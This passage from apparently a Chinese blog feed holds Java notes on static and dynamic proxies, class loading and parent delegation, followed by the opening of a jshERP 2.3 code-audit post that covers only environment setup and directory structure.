class="hljs-string">&quot;query&quot;</span>);<br>        userService.query();<br>    &#125;<br><br>    <span class="hljs-comment">//日志方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Debug] 使用了&quot;</span>+msg+<span class="hljs-string">&quot;方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//代理类</span><br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();<br>        <span class="hljs-comment">//使用代理类实现日志功能！</span><br>        proxy.setUserService(userService);<br>        proxy.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(255, 0, 0);">在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png"></p><h2 id="3-2-动态代理"><a href="#3-2-动态代理" class="headerlink" title="3.2 动态代理"></a>3.2 动态代理</h2><ul><li>动态代理和静态代理角色一样</li><li>动态代理的代理类是动态生成的，不是我们直接写好的</li><li>动态代理分为俩大类：基于接口的动态代理，基于类的动态代理<ul><li>基于接口–JDK 动态代理</li><li>基于类–cglib</li><li>java 字节码实现：javasist</li></ul></li></ul><p><font style="color:#080808;background-color:#ffffff;">了解俩个类：</font></p><ul><li>Proxy：代理</li><li><font style="color:#080808;background-color:#ffffff;">InvocationHandler：调用处理程序</font></li></ul><p><strong><font style="color:rgb(255, 0, 0) !important;background-color:rgb(248, 248, 248) !important;">动态代理的好处</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">静态代理有的它都有，静态代理没有的，它也有！</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">公共的业务由代理来完成 . 实现了业务的分工 ,</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">公共业务发生扩展时变得更加集中和方便 .</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">一个动态代理 , 一般代理某一类业务</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">一个动态代理可以代理多个类，代理的是接口！</font></li></ul><p>案例一</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//房东</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//租房</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//使用此类自动生成代理类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//被代理的接口</span><br>    <span class="hljs-keyword">private</span> Rent rent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRent</span><span class="hljs-params">(Rent rent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.rent = rent;<br>    &#125;<br><br>    <span class="hljs-comment">//生成得到代理类</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      rent.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//处理代理实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//动态代理的本质，就是使用反射机制实现</span><br>        seeHouse();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> method.invoke(rent, args);<br>        <span class="hljs-comment">//return method.invoke(rent, args);</span><br>        fare();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介带看房子&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;收中介费&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//真实角色</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//代理角色，现在没有</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//通过调用程序处理角色来处理我们要调用的接口对象</span><br>        pih.setRent(host);<br>        <span class="hljs-type">Rent</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Rent) pih.getProxy();<br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>案例二：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//使用此类自动生成代理类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//被代理的接口</span><br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-comment">//生成得到代理类</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      target.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//处理代理实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log(method.getName());<br>        <span class="hljs-comment">//动态代理的本质，就是使用反射机制实现</span><br>        <span class="hljs-keyword">return</span> method.invoke(target, args);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行了&quot;</span>+msg+<span class="hljs-string">&quot;方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> com.kuang.demo02.UserService;<br><span class="hljs-keyword">import</span> com.kuang.demo02.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//真实角色</span><br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//代理角色，现在没有p</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//设置代理对象</span><br>        pih.setTarget(userService);<br>        <span class="hljs-comment">//动态生成代理类</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) pih.getProxy();<br>        proxy.add();<br>        <span class="hljs-comment">//        proxy.delete();</span><br>        <span class="hljs-comment">//        proxy.update();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4、类的动态加载"><a href="#4、类的动态加载" class="headerlink" title="4、类的动态加载"></a>4、类的动态加载</h1><blockquote><p><font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font></p><p><a href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p><p><font style="color:rgb(60, 60, 67);">类加载过程详解</font></p><p><a href="https://javaguide.cn/java/jvm/class-loading-process.html">https://javaguide.cn/java/jvm/class-loading-process.html</a></p></blockquote><h3 id="类加载过程："><a href="#类加载过程：" class="headerlink" title="类加载过程："></a>类加载过程：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png"></p><ul><li>**加载：**将类的 class 文件字节码加载到内存，并将静态数据转化为方法区的运行时数据结构，然后生成一个 java.lang.Class 对象</li><li>**链接：**将java类二进制数据合并到 JRE中<ul><li>**验证：**确保加载的类信息符合JVM规范，没有安全方面的问题</li><li>**准备：**正式为类变量 （static） 分配内存并设置类变量默认初始值的阶段（所以说static在初始化之前就已经有了一个值），这些内存都将在方法区中进行分配</li><li>**解析：**虚拟机将常量池内的符号引用替换为直接引用的过程</li></ul></li><li>**初始化：**执行初始化方法 <code>&lt;clinit&gt; ()</code>方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。<code>&lt;clinit&gt; ()</code>方法会将该类的静态变量合并。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        System.out.println(A.m);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        1、加载到内存，会在堆产生一个类对应的 Class 对象</span><br><span class="hljs-comment">        2、链接，链接结束后 m=0</span><br><span class="hljs-comment">        3、初始化</span><br><span class="hljs-comment">            &lt;clinit&gt;()&#123;</span><br><span class="hljs-comment">                System.out.println(&quot;A类静态代码块初始化&quot;);</span><br><span class="hljs-comment">                m = 300;</span><br><span class="hljs-comment">                m = 100;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            m = 100</span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A类静态代码块初始化&quot;</span>);<br>        m = <span class="hljs-number">300</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A类的无参构造初始化&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类加载器："><a href="#类加载器：" class="headerlink" title="类加载器："></a>类加载器：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java">ppackage com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//获取系统类的加载器</span><br>        ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br><br>        <span class="hljs-comment">//获取系统类的加载器的父类加载器-&gt;扩展类加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br><br>        <span class="hljs-comment">//获取扩展类加载器的父类加载器--&gt;根加载器（c/c++）</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br><br>        <span class="hljs-comment">//测试当前类是哪个类加载器加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Test07&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//测试 jdk 内部的类是谁加载的</span><br>        classLoader=Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//获得系统类加载器可以加载的路径</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>));<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\charsets.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\deploy.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\access-bridge-64.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\cldrdata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\dnsns.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jaccess.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jfxrt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\localedata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\nashorn.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunec.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunjce_provider.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunmscapi.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunpkcs11.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\zipfs.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\javaws.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jce.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfr.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfxswt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jsse.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\management-agent.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\plugin.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\resources.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\rt.jar;</span><br><span class="hljs-comment">        D:\JavaCode\study_code\annotation&amp;reflection\annotation\target\classes;</span><br><span class="hljs-comment">        C:\Users\SZZY\AppData\Local\Programs\IntelliJ IDEA Ultimate\lib\idea_rt.jar</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png"></p><h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>参考：<a href="https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B</a></p><p><a href="https://www.cnblogs.com/luckforefforts/p/13642685.html">https://www.cnblogs.com/luckforefforts/p/13642685.html</a></p><p><font style="color:rgb(89, 97, 114);">如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</font></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><font style="color:rgb(34, 34, 38);">java序列化与反序列化全讲解</font></p><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">https://blog.csdn.net/mocas_wang&#x2F;article&#x2F;details&#x2F;107621010</a></p><p><font style="color:rgb(37, 41, 51);">为什么HashMap要自己实现writeObject和readObject方法？</font></p><p><a href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p><p><font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font></p><p><a href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p><p><font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font></p><p><a href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p><p><font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font></p><p><a href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华夏ERP 2.3 代码审计</title>
    <link href="/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/jishenghua/jshERP/releases/tag/2.3">https://github.com/jishenghua/jshERP/releases/tag/2.3</a></p><h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p>MySQL 5.7.26，IDEA，Maven 3.9.1，JDK 1.8， </p><p>数据库新建jsh_erp数据库，导入sql文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png">IDEA 的 JDK 版本切换为1.8</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png"></p><p>Maven构建</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png"></p><p>运行 ErpApplication.java 启动程序</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png"></p><h1 id="目录分析"><a href="#目录分析" class="headerlink" title="目录分析"></a>目录分析</h1><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png"></p><p>这个项目的结构更像是 MVC 架构（ Mapper&#x2F;MapperXML； Controller  ），又增加了  Service 层 。</p><ul><li>Maven Assembly 插件，用于帮助打包； assembly.xml  是打包的配置文件</li><li>bin 中的文件都是 jshERP 的运行脚本</li><li>resources&#x2F;mapper_xml： MyBatis 框架的 SQL 映射配置文件， “数据库操作说明书”  </li><li>logback-spring.xml：日志文件输出配置</li><li>java<ul><li>config<ul><li><font style="color:#080808;background-color:#ffffff;">PluginBeanConfig.java  插件管理器 Bean</font></li><li><font style="color:#080808;background-color:#ffffff;">PluginConfiguration.java  配置插件系统的运行环境和参数  </font></li><li><font style="color:#080808;background-color:#ffffff;"> Swagger2Config.java      用于生成 RESTful API 文档 , 提供文档元信息  </font></li><li><font style="color:#080808;background-color:#ffffff;"> TenantConfig.java  项目数据库访问的</font>统一拦截器和插件配置中心</li><li>WebConfig.java 指定前端静态文件存放位置， 在 Spring Boot 内置 Web 服务器中生效</li></ul></li><li>constants     <ul><li>BusinessConstants  <font style="color:#080808;background-color:#ffffff;">业务字典类</font></li><li><font style="color:#080808;background-color:#ffffff;"> ExceptionConstants    异常与返回码管理类  </font></li></ul></li><li>controller      Web 